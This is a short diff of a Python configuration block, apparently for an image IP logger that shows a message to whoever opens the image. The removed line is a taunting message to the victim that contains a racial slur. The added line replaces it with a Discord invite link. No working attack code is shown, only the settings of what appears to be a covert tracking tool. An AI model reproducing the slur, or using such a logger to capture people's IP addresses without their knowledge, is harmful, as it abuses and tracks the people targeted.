@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": True, # Enable the custom message?
-        "message": "nice ip nigga!", # Message to show
+        "message": "https://discord.gg/gwUDs4Kg9y", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
